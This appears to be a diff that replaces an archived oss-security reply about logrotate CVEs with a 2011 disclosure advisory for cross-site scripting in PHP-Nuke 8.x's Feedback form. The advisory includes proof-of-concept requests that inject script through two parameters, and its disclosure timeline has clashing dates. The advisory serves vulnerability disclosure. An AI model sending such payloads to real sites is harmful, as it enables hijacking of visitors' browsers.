@@ -1,45 +1,121 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2011/03/08/5
-Message-Id: <201103080859.03319.ludwig.nussel@suse.de>
-Date: Tue, 8 Mar 2011 08:59:03 +0100
-From: Ludwig Nussel <ludwig.nussel@...e.de>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2011/03/23/8
+Message-ID: <AANLkTimsdnpV8DCAnpQCNDw154iAt8w7JH9cfyKfq=8h@mail.gmail.com>
+Date: Wed, 23 Mar 2011 23:06:08 +0800
+From: YGN Ethical Hacker Group <lists@...g.net>
 To: oss-security@...ts.openwall.com
-Cc: "Steven M. Christey" <coley@...us.mitre.org>, Stefan Fritsch <sf@...itsch.de>, Florian Zumbiehl <florz@...rz.de>, Petr Uzel <petr.uzel@...e.cz>, Thomas Biege <thomas@...e.de>, Jan Kaluža <jkaluza@...hat.com>
-Subject: Re: CVE Request -- logrotate -- nine issues
+Subject: CVE Request: PHP-Nuke 8.x <= Cross Site Scripting Vulnerability
 Content-Type: text/plain; charset=utf-8
 
-Josh Bressers wrote:
-> [...]
-> It seems there is now a consensus on this (at least that's how I'm reading
-> it). Here is what I plan to do with CVE ids unless someone speaks up.
-> 
-> As best as I can tell, logrotate only needs a CVE id for this:
-> 
->     8) Issue #8: logrotate: TOCTOU race condition by creation of new files
->        (between opening the file and moment, final permissions have been
->        applied) [information disclosure]
-> 
+PHP-Nuke 8.x <= Cross Site Scripting Vulnerability
 
-Ack.
- 
-> We then will need to assign IDs for various broken uses of /var/log (If
-> someone has a list of the currently known ones, please pass it along)
 
-AFAICS on openSUSE Factory we have
-cobbler
-inn
-safte-monitor
-uucp
 
-service owned log dirs without logrotate:
-cups
-horde
+1. OVERVIEW
 
-cu
-Ludwig
+The PHP-Nuke version 8.x and lower are vulnerable to Cross Site Scrtipting.
 
--- 
- (o_   Ludwig Nussel
- //\
- V_/_  http://www.suse.de/
-SUSE LINUX Products GmbH, GF: Markus Rex, HRB 16746 (AG Nuernberg)
+
+2. BACKGROUND
+
+PHP-Nuke is a Web Portal System or content management system. The goal
+of PHP-Nuke is to have an automated web site to distribute news and
+articles with users system. Each user can submit comments to discuss
+the articles. Main features include: web based admin, surveys, top
+page, access stats page with counter, user customizable box, themes
+manager for registered users, friendly administration GUI with graphic
+topic manager, option to edit or delete stories, option to delete
+comments, moderation system, Referrers page to know who link us,
+sections manager, customizable HTML blocks, user and authors edit, an
+integrated Banners Ads system, search engine, backend/headlines
+generation (RSS/RDF format), and many, many more friendly functions.
+
+
+3. VULNERABILITY DESCRIPTION
+
+The "sender_name" and the "sender_email" parameter are not properly
+sanitized upon submission to the /modules.php?name=Feedback, which
+allows attacker to conduct Cross Site Scripting attack. This may allow
+an attacker to create a specially crafted URL that would execute
+arbitrary script code in a victim's browser.
+
+
+4. VERSIONS AFFECTED
+
+8.0 and lower
+
+Tested version: 8.0
+The paid versions, 8.1 and 9.0, of PHP-Nuke may be vulnerable as well.
+
+
+5. PROOF-OF-CONCEPT/EXPLOIT
+
+Parameter: sender_name
+
+[REQUEST]
+POST /phpnuke/modules.php?name=Feedback HTTP/1.1
+Host: attacker.in
+Referer: http://attacker.in/phpnuke/modules.php?name=Feedback
+
+sender_name=%22%3E%3Cimg+src%3Dx+onerror%3Dalert%28%2FXSS%2F%29%3E&sender_email=&message=&opi=ds&submit=Send
+[/REQUEST]
+
+---------------------------------------------------------
+Parameter: sender_email
+
+[REQUEST]
+POST /phpnuke/modules.php?name=Feedback HTTP/1.1
+Host: attacker.in
+Referer: http://attacker.in/phpnuke/modules.php?name=Feedback
+
+sender_email=%22%3E%3Cimg+src%3Dx+onerror%3Dalert%28%2FXSS%2F%29%3E&sender_name=&message=&opi=ds&submit=Send
+[/REQUEST]
+
+
+6. SOLUTION
+
+Not Available.
+Use of this product is NOT recommended because of long lack of update
+and vendor negligence about security reports.
+
+
+7. VENDOR
+
+PHP-Nuke Developers
+http://phpnuke.org/
+
+
+8. CREDIT
+
+Aung Khant, http://yehg.net, YGN Ethical Hacker Group, Myanmar.
+
+
+9. DISCLOSURE TIME-LINE
+
+2011-01-01: contacted author through emails
+2011-01-25: contacted author through web site contact form
+2010-03-23: no replies from author
+2010-03-23: vulnerability disclosed
+
+
+10. REFERENCES
+
+Original Advisory URL:
+http://yehg.net/lab/pr0js/advisories/[phpnuke-8.x]_cross_site_scripting
+About PHP-Nuke: http://en.wikipedia.org/wiki/PHP-Nuke
+php-Nuke 8.0: http://phpnuke.org/modules.php?name=Downloads&d_op=getit&lid=658
+CWE-79: http://cwe.mitre.org/data/definitions/79.html
+
+
+
+#yehg [2010-03-23]
+
+keywords: php nuke, php-nuke, phpnuke, 8.0, 8.1,  xss
+
+---------------------------------
+Best regards,
+YGN Ethical Hacker Group
+Yangon, Myanmar
+http://yehg.net
+Our Lab | http://yehg.net/lab
+Our Directory | http://yehg.net/hwd
